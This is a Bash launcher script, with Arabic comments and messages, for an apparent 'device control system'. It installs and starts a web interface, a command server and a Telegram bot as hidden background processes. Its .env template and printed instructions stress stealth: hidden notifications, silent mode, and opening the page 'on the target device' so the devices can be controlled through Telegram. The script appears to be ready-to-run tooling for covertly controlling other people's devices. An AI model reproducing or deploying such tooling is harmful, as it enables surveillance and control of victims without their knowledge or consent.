#!/bin/bash

# نظام التحكم في الأجهزة - سكريبت التشغيل المحسن
# إعدادات الأمان والتخفي

# ألوان للعرض
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# إعدادات النظام
STEALTH_MODE=true
SECURITY_MODE=true
AUTO_RESTART=true
LOG_LEVEL="info"

# مسارات النظام
PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WEB_INTERFACE_DIR="$PROJECT_DIR/web-interface"
COMMAND_SERVER_DIR="$PROJECT_DIR/command-server"
TELEGRAM_BOT_DIR="$PROJECT_DIR/telegram-bot"
LOGS_DIR="$PROJECT_DIR/logs"
DATA_DIR="$PROJECT_DIR/data"

# إنشاء المجلدات المطلوبة
create_directories() {
    echo -e "${BLUE}📁 إنشاء المجلدات المطلوبة...${NC}"
    
    mkdir -p "$LOGS_DIR"
    mkdir -p "$DATA_DIR"
    mkdir -p "$WEB_INTERFACE_DIR/data"
    mkdir -p "$WEB_INTERFACE_DIR/templates"
    mkdir -p "$COMMAND_SERVER_DIR/data"
    mkdir -p "$COMMAND_SERVER_DIR/uploads"
    mkdir -p "$COMMAND_SERVER_DIR/logs"
    
    echo -e "${GREEN}✅ تم إنشاء المجلدات بنجاح${NC}"
}

# التحقق من المتطلبات الأساسية
check_requirements() {
    echo -e "${BLUE}🔍 التحقق من المتطلبات الأساسية...${NC}"
    
    # التحقق من Node.js
    if ! command -v node &> /dev/null; then
        echo -e "${RED}❌ Node.js غير مثبت. يرجى تثبيته أولاً.${NC}"
        echo -e "${YELLOW}💡 يمكنك تثبيته من: https://nodejs.org/${NC}"
        exit 1
    fi
    
    # التحقق من إصدار Node.js
    NODE_VERSION=$(node -v | cut -d'v' -f2 | cut -d'.' -f1)
    if [ "$NODE_VERSION" -lt 16 ]; then
        echo -e "${RED}❌ يتطلب Node.js إصدار 16 أو أحدث. الإصدار الحالي: $(node -v)${NC}"
        exit 1
    fi
    
    # التحقق من Python
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Python3 غير مثبت. يرجى تثبيته أولاً.${NC}"
        echo -e "${YELLOW}💡 يمكنك تثبيته من: https://python.org/${NC}"
        exit 1
    fi
    
    # التحقق من إصدار Python
    PYTHON_VERSION=$(python3 -c "import sys; print(sys.version_info.major)")
    if [ "$PYTHON_VERSION" -lt 3 ]; then
        echo -e "${RED}❌ يتطلب Python إصدار 3 أو أحدث.${NC}"
        exit 1
    fi
    
    # التحقق من npm
    if ! command -v npm &> /dev/null; then
        echo -e "${RED}❌ npm غير مثبت. يرجى تثبيته أولاً.${NC}"
        exit 1
    fi
    
    # التحقق من pip
    if ! command -v pip3 &> /dev/null; then
        echo -e "${RED}❌ pip3 غير مثبت. يرجى تثبيته أولاً.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}✅ تم التحقق من المتطلبات الأساسية${NC}"
}

# تثبيت التبعيات
install_dependencies() {
    echo -e "${BLUE}📦 تثبيت التبعيات...${NC}"
    
    # تثبيت تبعيات واجهة الويب
    echo -e "${CYAN}تثبيت تبعيات واجهة الويب...${NC}"
    cd "$WEB_INTERFACE_DIR"
    if npm install --silent; then
        echo -e "${GREEN}✅ تم تثبيت تبعيات واجهة الويب${NC}"
    else
        echo -e "${RED}❌ فشل في تثبيت تبعيات واجهة الويب${NC}"
        exit 1
    fi
    
    # تثبيت تبعيات خادم التحكم
    echo -e "${CYAN}تثبيت تبعيات خادم التحكم...${NC}"
    cd "$COMMAND_SERVER_DIR"
    if npm install --silent; then
        echo -e "${GREEN}✅ تم تثبيت تبعيات خادم التحكم${NC}"
    else
        echo -e "${RED}❌ فشل في تثبيت تبعيات خادم التحكم${NC}"
        exit 1
    fi
    
    # تثبيت تبعيات بوت تيليجرام
    echo -e "${CYAN}تثبيت تبعيات بوت تيليجرام...${NC}"
    cd "$TELEGRAM_BOT_DIR"
    if pip3 install -r requirements.txt --quiet; then
        echo -e "${GREEN}✅ تم تثبيت تبعيات بوت تيليجرام${NC}"
    else
        echo -e "${RED}❌ فشل في تثبيت تبعيات بوت تيليجرام${NC}"
        exit 1
    fi
    
    cd "$PROJECT_DIR"
    echo -e "${GREEN}✅ تم تثبيت جميع التبعيات بنجاح${NC}"
}

# إعداد متغيرات البيئة
setup_environment() {
    echo -e "${BLUE}⚙️ إعداد متغيرات البيئة...${NC}"
    
    # إنشاء ملف .env إذا لم يكن موجوداً
    if [ ! -f "$PROJECT_DIR/.env" ]; then
        cat > "$PROJECT_DIR/.env" << EOF
# إعدادات النظام
NODE_ENV=production
LOG_LEVEL=$LOG_LEVEL
STEALTH_MODE=$STEALTH_MODE
SECURITY_MODE=$SECURITY_MODE

# إعدادات الخوادم
WEB_INTERFACE_PORT=3000
COMMAND_SERVER_PORT=4000

# إعدادات البوت
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
ADMIN_USER_ID=123456789

# إعدادات الأمان
ADMIN_TOKEN=your-secure-admin-token-here
ENCRYPTION_KEY=your-32-character-encryption-key-here

# إعدادات قاعدة البيانات
DB_PATH=$DATA_DIR/devices.db

# إعدادات التخفي
HIDE_NOTIFICATIONS=true
SILENT_MODE=true
BACKGROUND_EXECUTION=true
EOF
        echo -e "${GREEN}✅ تم إنشاء ملف .env${NC}"
    else
        echo -e "${YELLOW}⚠️ ملف .env موجود بالفعل${NC}"
    fi
}

# تشغيل الخوادم
start_servers() {
    echo -e "${BLUE}🚀 بدء تشغيل الخوادم...${NC}"
    
    # تشغيل خادم واجهة الويب
    echo -e "${CYAN}تشغيل خادم واجهة الويب على المنفذ 3000...${NC}"
    cd "$WEB_INTERFACE_DIR"
    if [ "$STEALTH_MODE" = true ]; then
        # تشغيل في الخلفية مع إخفاء
        nohup node server.js > "$LOGS_DIR/web-interface.log" 2>&1 &
        WEB_PID=$!
        echo $WEB_PID > "$LOGS_DIR/web-interface.pid"
    else
        # تشغيل في نافذة منفصلة
        if command -v gnome-terminal &> /dev/null; then
            gnome-terminal --title="Web Interface Server" -- bash -c "npm start; exec bash" &
        elif command -v xterm &> /dev/null; then
            xterm -title "Web Interface Server" -e "npm start" &
        else
            nohup npm start > "$LOGS_DIR/web-interface.log" 2>&1 &
        fi
    fi
    
    sleep 3
    
    # تشغيل خادم التحكم
    echo -e "${CYAN}تشغيل خادم التحكم على المنفذ 4000...${NC}"
    cd "$COMMAND_SERVER_DIR"
    if [ "$STEALTH_MODE" = true ]; then
        # تشغيل في الخلفية مع إخفاء
        nohup node server.js > "$LOGS_DIR/command-server.log" 2>&1 &
        COMMAND_PID=$!
        echo $COMMAND_PID > "$LOGS_DIR/command-server.pid"
    else
        # تشغيل في نافذة منفصلة
        if command -v gnome-terminal &> /dev/null; then
            gnome-terminal --title="Command Server" -- bash -c "npm start; exec bash" &
        elif command -v xterm &> /dev/null; then
            xterm -title "Command Server" -e "npm start" &
        else
            nohup npm start > "$LOGS_DIR/command-server.log" 2>&1 &
        fi
    fi
    
    sleep 3
    
    # تشغيل بوت تيليجرام
    echo -e "${CYAN}تشغيل بوت تيليجرام...${NC}"
    cd "$TELEGRAM_BOT_DIR"
    if [ "$STEALTH_MODE" = true ]; then
        # تشغيل في الخلفية مع إخفاء
        nohup python3 bot.py > "$LOGS_DIR/telegram-bot.log" 2>&1 &
        BOT_PID=$!
        echo $BOT_PID > "$LOGS_DIR/telegram-bot.pid"
    else
        # تشغيل في نافذة منفصلة
        if command -v gnome-terminal &> /dev/null; then
            gnome-terminal --title="Telegram Bot" -- bash -c "python3 bot.py; exec bash" &
        elif command -v xterm &> /dev/null; then
            xterm -title "Telegram Bot" -e "python3 bot.py" &
        else
            nohup python3 bot.py > "$LOGS_DIR/telegram-bot.log" 2>&1 &
        fi
    fi
    
    cd "$PROJECT_DIR"
    echo -e "${GREEN}✅ تم تشغيل جميع الخوادم${NC}"
}

# التحقق من حالة الخوادم
check_servers_status() {
    echo -e "${BLUE}🔍 التحقق من حالة الخوادم...${NC}"
    
    # التحقق من خادم واجهة الويب
    if curl -s http://localhost:3000 > /dev/null 2>&1; then
        echo -e "${GREEN}✅ خادم واجهة الويب يعمل على http://localhost:3000${NC}"
    else
        echo -e "${RED}❌ خادم واجهة الويب غير متاح${NC}"
    fi
    
    # التحقق من خادم التحكم
    if curl -s http://localhost:4000 > /dev/null 2>&1; then
        echo -e "${GREEN}✅ خادم التحكم يعمل على http://localhost:4000${NC}"
    else
        echo -e "${RED}❌ خادم التحكم غير متاح${NC}"
    fi
    
    # التحقق من بوت تيليجرام
    if [ -f "$LOGS_DIR/telegram-bot.pid" ]; then
        BOT_PID=$(cat "$LOGS_DIR/telegram-bot.pid")
        if ps -p $BOT_PID > /dev/null 2>&1; then
            echo -e "${GREEN}✅ بوت تيليجرام يعمل (PID: $BOT_PID)${NC}"
        else
            echo -e "${RED}❌ بوت تيليجرام غير متاح${NC}"
        fi
    else
        echo -e "${RED}❌ بوت تيليجرام غير متاح${NC}"
    fi
}

# عرض معلومات النظام
show_system_info() {
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    نظام التحكم في الأجهزة                    ║"
    echo "║                        النسخة المحسنة                        ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${CYAN}📊 معلومات النظام:${NC}"
    echo -e "   • نظام التشغيل: $(uname -s) $(uname -r)"
    echo -e "   • المعالج: $(uname -m)"
    echo -e "   • الذاكرة المتاحة: $(free -h | awk 'NR==2{printf "%.1f GB", $7/1024}')"
    echo -e "   • المساحة المتاحة: $(df -h . | awk 'NR==2{print $4}')"
    echo -e "   • Node.js: $(node -v)"
    echo -e "   • Python: $(python3 --version)"
    echo -e "   • وضع التخفي: $([ "$STEALTH_MODE" = true ] && echo "مفعل" || echo "معطل")"
    echo -e "   • وضع الأمان: $([ "$SECURITY_MODE" = true ] && echo "مفعل" || echo "معطل")"
    echo ""
}

# عرض التعليمات
show_instructions() {
    echo -e "${YELLOW}📋 التعليمات:${NC}"
    echo -e "   🌐 واجهة الويب: http://localhost:3000"
    echo -e "   🔧 خادم التحكم: http://localhost:4000"
    echo -e "   🤖 بوت تيليجرام: يعمل في الخلفية"
    echo ""
    echo -e "${YELLOW}⚠️ ملاحظات مهمة:${NC}"
    echo -e "   • تأكد من تحديث رمز البوت في ملف bot.py"
    echo -e "   • افتح http://localhost:3000 على الجهاز المستهدف"
    echo -e "   • استخدم بوت تيليجرام للتحكم في الأجهزة"
    echo -e "   • جميع الاتصالات مشفرة ومؤمنة"
    echo -e "   • النظام يعمل في الخلفية بدون إشعارات"
    echo ""
}

# وظيفة التنظيف عند الإغلاق
cleanup() {
    echo -e "${YELLOW}🧹 تنظيف النظام...${NC}"
    
    # إيقاف الخوادم
    if [ -f "$LOGS_DIR/web-interface.pid" ]; then
        kill $(cat "$LOGS_DIR/web-interface.pid") 2>/dev/null
        rm -f "$LOGS_DIR/web-interface.pid"
    fi
    
    if [ -f "$LOGS_DIR/command-server.pid" ]; then
        kill $(cat "$LOGS_DIR/command-server.pid") 2>/dev/null
        rm -f "$LOGS_DIR/command-server.pid"
    fi
    
    if [ -f "$LOGS_DIR/telegram-bot.pid" ]; then
        kill $(cat "$LOGS_DIR/telegram-bot.pid") 2>/dev/null
        rm -f "$LOGS_DIR/telegram-bot.pid"
    fi
    
    echo -e "${GREEN}✅ تم تنظيف النظام${NC}"
    exit 0
}

# التقاط إشارة الإغلاق
trap cleanup SIGINT SIGTERM

# الوظيفة الرئيسية
main() {
    show_system_info
    
    create_directories
    check_requirements
    install_dependencies
    setup_environment
    start_servers
    
    sleep 5
    
    check_servers_status
    show_instructions
    
    echo -e "${GREEN}🎉 تم تشغيل النظام بنجاح!${NC}"
    echo -e "${GREEN}🔒 النظام محمي ومشفر بالكامل${NC}"
    echo -e "${GREEN}👻 وضع التخفي مفعل${NC}"
    echo ""
    
    # انتظار إشارة الإغلاق
    if [ "$AUTO_RESTART" = true ]; then
        echo -e "${YELLOW}🔄 النظام سيعيد التشغيل تلقائياً في حالة التوقف${NC}"
    fi
    
    # انتظار إلى ما لا نهاية
    while true; do
        sleep 1
    done
}

# تشغيل الوظيفة الرئيسية
main "$@"